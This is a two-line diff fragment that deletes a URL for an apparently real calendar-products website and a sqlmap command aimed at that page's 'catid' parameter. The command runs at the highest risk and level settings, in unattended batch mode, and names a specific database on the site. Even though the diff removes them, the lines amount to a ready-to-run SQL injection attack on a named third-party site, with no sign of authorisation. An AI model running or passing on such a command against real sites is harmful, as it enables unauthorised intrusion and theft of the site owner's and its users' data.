@@ -1,2 +1,0 @@
-http://www.vinayagacalendars.com/products.php?catid=49
-python ../sqlmap/sqlmap.py -u http://www.vinayagacalendars.com/products.php?catid=49 --risk 3 --level 5 --batch -D vinayaga_vinayagacalendar
